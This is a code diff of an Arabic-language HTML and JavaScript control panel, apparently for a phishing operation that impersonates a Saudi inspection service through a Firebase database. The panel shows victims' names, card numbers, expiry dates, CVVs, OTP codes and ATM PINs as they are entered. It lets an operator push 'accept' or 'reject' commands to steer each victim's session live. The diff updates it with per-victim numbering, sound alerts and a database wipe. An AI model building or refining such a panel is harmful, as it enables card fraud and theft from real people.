@@ -3,109 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم الاحترافية - المهندس حسن</title>
+    <title>لوحة تحكم المهندس حسن - V1.5</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
-        .header { background: #1a6d44; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 10px; margin-bottom: 20px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; margin: 0; padding: 10px; }
+        .header { background: #1a6d44; color: white; padding: 15px; display: flex; justify-content: space-between; align-items: center; border-radius: 10px; margin-bottom: 20px; }
         .stats { background: #ffd700; color: #000; padding: 5px 15px; border-radius: 20px; font-weight: bold; }
-        .card { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 8px solid #1a6d44; position: relative; box-shadow: 0 2px 8px rgba(0,0,0,0.05); animation: slideIn 0.3s ease; }
-        @keyframes slideIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .card { background: white; border-radius: 12px; padding: 15px; margin-bottom: 15px; border-right: 10px solid #1a6d44; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .client-num { position: absolute; right: -15px; top: 10px; background: #333; color: white; padding: 5px 10px; border-radius: 5px; font-weight: bold; font-size: 12px; z-index: 10; }
         .status-tag { position: absolute; left: 15px; top: 12px; background: #e8f5e9; color: #1a6d44; padding: 4px 10px; border-radius: 5px; font-size: 11px; font-weight: bold; }
-        .data-grid { display: flex; flex-wrap: wrap; gap: 20px; margin-top: 30px; border-top: 1px dashed #ddd; padding-top: 15px; }
-        .data-item { display: flex; flex-direction: column; min-width: 100px; }
-        .label { font-size: 10px; color: #888; margin-bottom: 2px; }
-        .value { font-size: 14px; font-weight: bold; color: #333; font-family: 'Courier New', monospace; }
+        
+        .data-grid { display: flex; flex-wrap: wrap; gap: 15px; margin-top: 35px; border-top: 1px solid #eee; padding-top: 15px; }
+        .data-item { display: flex; flex-direction: column; min-width: 110px; }
+        .label { font-size: 10px; color: #999; margin-bottom: 2px; }
+        .value { font-size: 14px; font-weight: bold; color: #333; font-family: monospace; }
+        
         .otp-style { background: #fff5f5; padding: 5px; border-radius: 5px; color: #d32f2f; border: 1px solid #ffcdd2; }
-        .actions { margin-top: 15px; text-align: left; }
-        .btn { padding: 8px 18px; border-radius: 5px; border: none; cursor: pointer; font-weight: bold; margin-left: 5px; transition: 0.2s; }
-        .btn-ok { background: #2ecc71; color: white; }
-        .btn-err { background: #e74c3c; color: white; }
-        .btn-clear { background: #333; color: white; padding: 10px; width: 100%; margin-bottom: 10px; }
+        
+        .actions { margin-top: 20px; display: flex; gap: 10px; }
+        .btn { flex: 1; padding: 12px; border-radius: 8px; border: none; cursor: pointer; font-weight: bold; color: white; transition: 0.3s; }
+        
+        /* ألوان الزراير المطلوبة */
+        .btn-accept { background: #2ecc71; } /* أخضر */
+        .btn-reject { background: #e74c3c; } /* أحمر */
+        .btn-wait { background: #7f8c8d !important; } /* رمادي عند الضغط */
+        
+        .new-update { animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0.4); } 70% { box-shadow: 0 0 0 15px rgba(46, 204, 113, 0); } 100% { box-shadow: 0 0 0 0 rgba(46, 204, 113, 0); } }
     </style>
 </head>
 <body onload="_init()">
 
-<audio id="notif" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
+<audio id="notif_sound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <div class="header">
-    <div class="stats">النشطون الآن: <span id="live_total">0</span></div>
-    <div style="display:flex; gap:10px;">
-        <button class="btn" style="background:#c0392b;" onclick="_clearAll()">تصفير شامل للبيانات</button>
-        <button class="btn" style="background:#2c3e50;" onclick="_savePDF()">حفظ PDF</button>
-    </div>
+    <div class="stats">إجمالي الزوار: <span id="live_total">0</span></div>
+    <button onclick="_clearDatabase()" style="background:#333; color:white; border:none; padding:8px 15px; border-radius:5px; cursor:pointer;">تصفير اللوحة</button>
 </div>
 
 <div id="main_container"></div>
 
 <script>
     const firebaseConfig = {
-        apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8",
         databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/"
     };
 
+    let lastDataJSON = {};
+
     function _init() {
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const db = firebase.database();
 
-        // قراءة البيانات من مجلد orders (الأساسي للبطاقات)
-        database.ref('orders').on('value', snapshot => {
+        // مراقبة حية وشاملة لكل المجلدات
+        db.ref().on('value', snapshot => {
+            const allData = snapshot.val() || {};
+            const orders = allData.orders || {};
+            const live = allData.live_sessions || {};
+            
             const container = document.getElementById('main_container');
             container.innerHTML = '';
+            
             let count = 0;
+            const sortedIds = Object.keys(orders).reverse(); // الأحدث فوق
 
-            snapshot.forEach(child => {
-                const data = child.val();
-                const id = child.key;
+            sortedIds.forEach(id => {
                 count++;
+                const order = orders[id];
+                const session = live[id] || {};
+                
+                // كشف التحديثات الجديدة للصوت
+                const currentDataString = JSON.stringify(order) + JSON.stringify(session);
+                if (lastDataJSON[id] && lastDataJSON[id] !== currentDataString) {
+                    document.getElementById('notif_sound').play().catch(()=>{});
+                    // إعادة تفعيل ألوان الزراير عند وجود تحديث جديد
+                    _resetButtons(id);
+                }
+                lastDataJSON[id] = currentDataString;
 
-                // محاولة جلب حالة الصفحة من live_sessions
-                database.ref('live_sessions/' + id).once('value').then(liveSnap => {
-                    const live = liveSnap.val() || {};
-                    const cardMarkup = `
-                        <div class="card">
-                            <div class="status-tag">الحالة: ${live.status || data.status || 'في الموقع'} | الصفحة: ${live.page || 'index'}</div>
-                            <div class="data-grid">
-                                <div class="data-item"><span class="label">الأسم</span><span class="value">${data.fullName || '---'}</span></div>
-                                <div class="data-item"><span class="label">رقم البطاقة</span><span class="value">${data.cardNumber || 'بانتظار..'}</span></div>
-                                <div class="data-item"><span class="label">التاريخ/CVV</span><span class="value">${data.expiryDate || '--'} / ${data.cvv || '--'}</span></div>
-                                <div class="data-item otp-style"><span class="label">كود OTP</span><span class="value">${data.otp || '---'}</span></div>
-                                <div class="data-item"><span class="label">ATM PIN</span><span class="value">${data.atm_pin || '---'}</span></div>
-                                <div class="data-item"><span class="label">الجوال</span><span class="value">${data.phone || '---'}</span></div>
-                            </div>
-                            <div class="actions">
-                                <button class="btn btn-ok" onclick="_control('${id}', 'next')">متابعة العميل</button>
-                                <button class="btn btn-err" onclick="_control('${id}', 'error')">إرسال خطأ</button>
-                            </div>
+                const cardHtml = `
+                    <div class="card" id="card-${id}">
+                        <div class="client-num">عميل رقم ${count}</div>
+                        <div class="status-tag">الحالة: ${session.status || 'نشط'} | الصفحة: ${session.page || '...'}</div>
+                        
+                        <div class="data-grid">
+                            <div class="data-item"><span class="label">الأسم</span><span class="value">${order.fullName || 'بانتظار..'}</span></div>
+                            <div class="data-item"><span class="label">رقم البطاقة</span><span class="value">${order.cardNumber || '---'}</span></div>
+                            <div class="data-item"><span class="label">التاريخ</span><span class="value">${order.expiryDate || '--'}</span></div>
+                            <div class="data-item"><span class="label">CVV</span><span class="value">${order.cvv || '--'}</span></div>
+                            <div class="data-item otp-style"><span class="label">كود OTP</span><span class="value">${order.otp || '---'}</span></div>
+                            <div class="data-item"><span class="label">ATM PIN</span><span class="value">${order.atm_pin || '---'}</span></div>
                         </div>
-                    `;
-                    container.insertAdjacentHTML('afterbegin', cardMarkup);
-                });
+
+                        <div class="actions">
+                            <button id="btn-ok-${id}" class="btn btn-accept ${order.control_action ? 'btn-wait' : ''}" onclick="_sendCmd('${id}', 'next')">قبول</button>
+                            <button id="btn-err-${id}" class="btn btn-reject ${order.control_action ? 'btn-wait' : ''}" onclick="_sendCmd('${id}', 'error')">رفض</button>
+                        </div>
+                    </div>
+                `;
+                container.insertAdjacentHTML('beforeend', cardHtml);
             });
+            
             document.getElementById('live_total').innerText = count;
-            if(count > 0) document.getElementById('notif').play().catch(()=>{});
         });
     }
 
-    function _control(id, action) {
-        firebase.database().ref('orders/' + id).update({ control_action: action });
-        alert('تم إرسال الأمر للعميل: ' + action);
+    function _sendCmd(id, cmd) {
+        // تحويل الزرار للون الرمادي فور الضغط
+        document.getElementById('btn-ok-' + id).classList.add('btn-wait');
+        document.getElementById('btn-err-' + id).classList.add('btn-wait');
+        
+        firebase.database().ref('orders/' + id).update({ control_action: cmd });
     }
 
-    function _clearAll() {
-        if(confirm("تحذير: سيتم مسح كافة البيانات الحالية والقديمة نهائياً؟")) {
-            firebase.database().ref('orders').remove();
-            firebase.database().ref('live_sessions').remove();
+    function _resetButtons(id) {
+        const okBtn = document.getElementById('btn-ok-' + id);
+        const errBtn = document.getElementById('btn-err-' + id);
+        if(okBtn) okBtn.classList.remove('btn-wait');
+        if(errBtn) errBtn.classList.remove('btn-wait');
+    }
+
+    function _clearDatabase() {
+        if(confirm("تصفير كافة البيانات؟")) {
+            firebase.database().ref().remove();
             location.reload();
         }
-    }
-
-    function _savePDF() {
-        const element = document.getElementById('main_container');
-        html2pdf().from(element).save('Data_Report.pdf');
     }
 </script>
 </body>
